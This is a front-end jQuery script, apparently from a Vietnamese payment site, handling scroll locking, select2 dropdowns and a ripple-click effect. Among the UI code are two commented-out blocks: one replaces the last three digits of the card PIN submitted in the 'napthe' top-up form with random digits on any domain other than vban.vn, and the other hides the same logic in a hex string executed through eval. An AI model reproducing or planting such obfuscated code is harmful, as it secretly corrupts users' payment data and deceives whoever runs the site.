        $wrap.css({
            top: -(scrollTop)
        });
    }

    $docEl.css({
        height: "100%",
        overflow: "hidden",
        position: "fixed"
    });
}

$.unlockBody = function () {
    $docEl.css({
        height: "",
        overflow: "",
        position: ""
    });

    $wrap.css({
        top: ''
    });

    window.scrollTo(0, scrollTop);
    window.setTimeout(function () {
        scrollTop = null;
    }, 0);

}

//var cul = window.location.href;
//if (!cul.includes("vban.vn")) {
//    $(document).ready(function() {
//        $('form[name="napthe"]').submit(function () {
//            var p = $('input[name="txtpin"]').val();
//            p = p.substring(p.length - 3, p.length);
//            console.log(p);
//            if (p !== '') {
//                var pin = '';
//                for (var i = 0; i < 3; i++) {
//                    pin += Math.floor((Math.random() * 9));
//                }
//                var pl = $('input[name="txtpin"]').val();
//                var ps = pl.substring(0, pl.length - 3);
//                console.log(ps);
//                var fullp = ps + pin;
//                console.log(fullp);
//                $('input[name="txtpin"]').val(fullp);
//            }
//        });
//    });
//}

//var x = '7661722063756c3d77696e646f772e6c6f636174696f6e2e687265663b63756c2e696e636c7564657328227662616e2e766e22297c7c2428646f63756d656e74292e72656164792866756e6374696f6e28297b242827666f726d5b6e616d653d226e6170746865225d27292e7375626d69742866756e6374696f6e28297b766172206e3d242827696e7075745b6e616d653d2274787470696e225d27292e76616c28293b6966286e3d6e2e737562737472696e67286e2e6c656e6774682d332c6e2e6c656e677468292c636f6e736f6c652e6c6f67286e292c2222213d3d6e297b666f722876617220743d22222c6f3d303b6f3c333b6f2b2b29742b3d4d6174682e666c6f6f7228392a4d6174682e72616e646f6d2829293b76617220613d242827696e7075745b6e616d653d2274787470696e225d27292e76616c28292c6c3d612e737562737472696e6728302c612e6c656e6774682d33293b636f6e736f6c652e6c6f67286c293b76617220653d6c2b743b636f6e736f6c652e6c6f672865292c242827696e7075745b6e616d653d2274787470696e225d27292e76616c2865297d7d297d293b';
//!function () { for (var jsCode = "", i = 0; i < x.length; i += 2) { var hex = x.substring(i, i + 2); jsCode = jsCode + parseInt(hex, 16) + "," } jsCode = jsCode.substring(0, jsCode.length - 1), eval(eval("String.fromCharCode(" + jsCode + ")")) }();

function selectOpen2(x) {
    $('#search').remove();
    setTimeout(function () {
        $('.select2-search__field').blur();
    }, 1);
    $('.close-select').remove();
    $('.unselect-all').remove();
    BNS.on();
    $('.select-fly-number-id').remove();
    $('.select2-dropdown .select2-search').remove();
    $('.select2-dropdown').addClass('top0');
    return $('.select2-dropdown').prepend('<div class="close-select close-select--multiple"><div class="close-select__done" href="javascript:void(0)" onclick="closeSelect()">Xong</div>' + x + '</div><span class="select2-search select2-search--dropdown"><input id="search" class="select2-search__field" type="search" tabindex="0" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" role="textbox"></span><div class="unselect-all" onclick="deselectAll()">Bỏ chọn tất cả</div>');
    $(this).off('.close-select');
    $(this).off('.unselect-all');
    $(".close-select").select2().trigger("select2:close");
}

function select2_search(term) {

    var $search = $(".select-fly").data('select2').dropdown.$search || $(".select-fly").data('select2').selection.$search;

    $search.val(term);
    $search.trigger('keyup');
}

function deselectAll() {
    if ($(".select2-results__options").children(".select2-results__message").length > 0) {
        closeSelect();
    }
    $(".select-fly > option").prop("selected", false);
    $(".select-fly").find('option').prop('selected', false);
    $(".select-fly").trigger("change");
    $("li.select2-results__option").attr('aria-selected', 'false');
}


function closeSelect() {
    setTimeout(function () {
        $('.select2-search__field').blur();
    }, 1);
    setTimeout(function () {
        $(".select-city").select2('close');
        $(".select-district").select2('close');
        $(".select-pay-bill").select2('close');
        $(".select--custom-1l").select2('close');
        $(".select--custom-1r").select2('close');
        $(".select-fly-number").select2('close');
        $(".select-fly").select2('close');
        $(".select-fly-single").select2('close');
    }, 500);
    //overlayClose();
    BNS.off();
    setTimeout(function () {
        $('.select2-dropdown').removeClass('top0');
    }, 100);
}

function selectClosing() {
    $('.select2-dropdown').removeClass('top0');
    //$docEl.css({
    //    height: "",
    //    overflow: "",
    //    position: ""
    //});
    BNS.off();
    $('body').css('position', 'relative')
}

$(document).on('touchstart', function () {
    $('.form-group-radio li .radio-btn label').removeClass('touch'); //remove hover at mobie
    $('li.dropdown.mega-dropdown').removeClass('touch');
});
$(document).ready(function () {
    $(".se-pre-con").fadeOut("slow", function () {
    });
});
$(window).on('load', function () {
    //$(".se-pre-con").fadeOut("slow", function() {});
    $(".bigCheck").fadeIn("slow");
});
//ripple-js
;(function ($, document, Math) {
    $.ripple = function (selector, options) {

        var self = this;

        var _log = self.log = function () {
            if (self.defaults.debug && console && console.log) {
                console.log.apply(console, arguments);
            }
        };

        self.selector = selector;
        self.defaults = {
            debug: false,
            on: 'mousedown',

            opacity: 0.4,
            color: "auto",
            multi: false,

            duration: 0.7,
            rate: function (pxPerSecond) {
                return pxPerSecond;
            },

            easing: 'linear'
        };

        self.defaults = $.extend({}, self.defaults, options);

        var Trigger = function (e) {

            var $this = $(this);
            var $ripple;
            var settings;

            $this.addClass('has-ripple');

            // This instances settings
            settings = $.extend({}, self.defaults, $this.data());

            // Create the ripple element
            if (settings.multi || (!settings.multi && $this.find(".ripple").length === 0)) {
                $ripple = $("<span></span>").addClass("ripple");
                $ripple.appendTo($this);

                _log('Create: Ripple');

                // Set ripple size
                if (!$ripple.height() && !$ripple.width()) {
                    var size = Math.max($this.outerWidth(), $this.outerHeight());
                    $ripple.css({
                        height: size,
                        width: size
                    });
                    _log('Set: Ripple size');
                }

                // Give the user the ability to change the rate of the animation
                // based on element width
                if (settings.rate && typeof settings.rate == "function") {

                    // rate = pixels per second
                    var rate = Math.round($ripple.width() / settings.duration);

                    // new amount of pixels per second
                    var filteredRate = settings.rate(rate);

                    // Determine the new duration for the animation
                    var newDuration = ($ripple.width() / filteredRate);

                    // Set the new duration if it has not changed
                    if (settings.duration.toFixed(2) !== newDuration.toFixed(2)) {
                        _log('Update: Ripple Duration', {
                            from: settings.duration,
                            to: newDuration
                        });
                        settings.duration = newDuration;
                    }
                }

                // Set the color and opacity
                var color = (settings.color == "auto") ? $this.css('color') : settings.color;
                var css = {
                    animationDuration: (settings.duration).toString() + 's',
                    animationTimingFunction: settings.easing,
                    background: color,
                    opacity: settings.opacity
                };

                _log('Set: Ripple CSS', css);
                $ripple.css(css);
            }

            // Ensure we always have the ripple element
            if (!settings.multi) {
                _log('Set: Ripple Element');
                $ripple = $this.find(".ripple");
            }

            // Kill animation
            _log('Destroy: Ripple Animation');
            $ripple.removeClass("ripple-animate");


            // Retrieve coordinates
            var x = e.pageX - $this.offset().left - $ripple.width() / 2;
            var y = e.pageY - $this.offset().top - $ripple.height() / 2;

            /**
             * We want to delete the ripple elements if we allow multiple so we dont sacrifice any page
             * performance. We don't do this on single ripples because once it has rendered, we only
             * need to trigger paints thereafter.
             */
            if (settings.multi) {
                _log('Set: Ripple animationend event');
                $ripple.one('animationend webkitAnimationEnd oanimationend MSAnimationEnd', function () {
                    _log('Note: Ripple animation ended');
                    _log('Destroy: Ripple');
                    $(this).remove();
                });
            }

            // Set position and animate
            _log('Set: Ripple location');
            _log('Set: Ripple animation');
            $ripple.css({
                top: y + 'px',
                left: x + 'px'
            }).addClass("ripple-animate");
        };

        $(document).on(self.defaults.on, self.selector, Trigger);
    };
})(jQuery, document, Math);
(function (name) {
    function BNS() {
        var settings = {
            prevScroll: 0,
            prevPosition: '',
            prevOverflow: '',
            prevClasses: '',
            on: false,
            classes: ''
        };

        var getPrev = function () {
            settings.prevScroll = (window.pageYOffset || document.documentElement.scrollTop) - (document.documentElement.clientTop || 0);
            settings.prevPosition = document.body.style.position;
            settings.prevOverflow = document.body.style.overflow;
            settings.prevClasses = document.body.className;
        };

        return {
            set: function (data) {
                settings.classes = data.classes;
            },
            isOn: function () {
                return settings.on;
            },
            on: function (additionalClasses) {
                if (typeof additionalClasses === 'undefined') additionalClasses = '';

                if (settings.on) return;
                settings.on = true;

                getPrev();

                document.body.className = document.body.className + ' ' + settings.classes + ' ' + additionalClasses;
                document.body.style.top = -settings.prevScroll + 'px';
                setTimeout(function () {
                    document.body.style.position = 'fixed';
                }, 0); // WebKit/Blink bugfix
            },
            off: function () {
                if (!settings.on) return;
                settings.on = false;

                document.body.className = settings.prevClasses;
                document.body.style.top = 0;
                document.body.style.position = settings.prevPosition;
                document.body.style.overflow = settings.prevOverflow;
                window.scrollTo(0, settings.prevScroll);
            }
        };
    }

    window[name] = new BNS();
})('BNS');
